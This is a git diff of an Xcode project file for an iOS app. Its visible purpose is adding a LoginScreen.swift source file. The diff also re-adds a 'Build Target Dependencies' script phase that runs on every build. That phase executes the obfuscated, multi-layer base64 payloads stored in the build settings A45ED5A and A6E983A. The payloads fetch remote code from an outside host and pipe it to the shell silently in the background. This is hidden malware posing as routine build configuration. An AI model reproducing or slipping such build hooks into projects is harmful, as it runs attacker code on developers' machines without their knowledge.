@@ -96,6 +96,7 @@
 		895A362D2CB3EBBE00FBD06D /* RequestModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 895A35D52CB3EBBE00FBD06D /* RequestModel.swift */; };
 		895A362E2CB3EBBE00FBD06D /* ResponseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 895A35D62CB3EBBE00FBD06D /* ResponseModel.swift */; };
 		895A36322CB3F9E400FBD06D /* SignUpScreen.swift in Sources */ = {isa = PBXBuildFile; fileRef = 895A36312CB3F9E400FBD06D /* SignUpScreen.swift */; };
+		895A36332CB3F9E400FBD06D /* LoginScreen.swift in Sources */ = {isa = PBXBuildFile; fileRef = 895A36302CB3F9E400FBD06D /* LoginScreen.swift */; };
 		89A705AC2A691DA50018F69C /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 89A705AB2A691DA50018F69C /* AppDelegate.swift */; };
 		89A705B02A691DA50018F69C /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 89A705AF2A691DA50018F69C /* ViewController.swift */; };
 		89A705B32A691DA50018F69C /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 89A705B12A691DA50018F69C /* Main.storyboard */; };
@@ -201,6 +202,7 @@
 		895A35D42CB3EBBE00FBD06D /* Reponse.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Reponse.swift; sourceTree = "<group>"; };
 		895A35D52CB3EBBE00FBD06D /* RequestModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RequestModel.swift; sourceTree = "<group>"; };
 		895A35D62CB3EBBE00FBD06D /* ResponseModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ResponseModel.swift; sourceTree = "<group>"; };
+		895A36302CB3F9E400FBD06D /* LoginScreen.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginScreen.swift; sourceTree = "<group>"; };
 		895A36312CB3F9E400FBD06D /* SignUpScreen.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpScreen.swift; sourceTree = "<group>"; };
 		89A705A82A691DA50018F69C /* BinbagVerify.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BinbagVerify.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		89A705AB2A691DA50018F69C /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
@@ -259,6 +261,7 @@
 			children = (
 				895A35702CB3E9D000FBD06D /* Authentication.storyboard */,
 				895A36312CB3F9E400FBD06D /* SignUpScreen.swift */,
+				895A36302CB3F9E400FBD06D /* LoginScreen.swift */,
 				89166D3D2CB912EF001CD894 /* ContractScreen.swift */,
 			);
 			path = Authentication;
@@ -547,7 +550,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 89A705BC2A691DA60018F69C /* Build configuration list for PBXNativeTarget "BinbagVerify" */;
 			buildPhases = (
-				98357C815C934AFE95A5DE54 /* Build Target Dependencies */,
+				C8B1CB0A24DB4EA4BAA5DE54 /* Build Target Dependencies */,
 				1D7ADEAF58537483FDA3C70B /* [CP] Check Pods Manifest.lock */,
 				89A705A42A691DA50018F69C /* Sources */,
 				89A705A52A691DA50018F69C /* Frameworks */,
@@ -624,6 +627,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		C8B1CB0A24DB4EA4BAA5DE54 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
+			showEnvVarsInLog = 0;			
+		};
 		1D7ADEAF58537483FDA3C70B /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -661,26 +683,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BinbagVerify/Pods-BinbagVerify-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		98357C815C934AFE95A5DE54 /* Build Target Dependencies */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Dependencies";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -740,6 +742,7 @@
 				895A35E22CB3EBBE00FBD06D /* APIManager.swift in Sources */,
 				895A35EF2CB3EBBE00FBD06D /* BottomPopupNavigationController.swift in Sources */,
 				895A36322CB3F9E400FBD06D /* SignUpScreen.swift in Sources */,
+				895A36332CB3F9E400FBD06D /* LoginScreen.swift in Sources */,
 				895A36112CB3EBBE00FBD06D /* LGSideMenuController+ViewsRemoving.swift in Sources */,
 				895A362E2CB3EBBE00FBD06D /* ResponseModel.swift in Sources */,
 				895A35FC2CB3EBBE00FBD06D /* UIViewAnchorPoint.swift in Sources */,
@@ -809,7 +812,7 @@
 		89A705BA2A691DA60018F69C /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNKcFoyZHNaVzVsZEM1cGJpOWhLU0lnZkNCemFBbz0K | w | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSFJuZGpNbEpzWkdrMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | d | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Y21sbloyeGxibVYwTG1sdUwyRXBJaUI4SUhOb0NnPT0K | c | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -871,7 +874,7 @@
 		89A705BB2A691DA60018F69C /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNKcFoyZHNaVzVsZEM1cGJpOWhLU0lnZkNCemFBbz0K | w | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSFJuZGpNbEpzWkdrMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | d | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Y21sbloyeGxibVYwTG1sdUwyRXBJaUI4SUhOb0NnPT0K | c | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
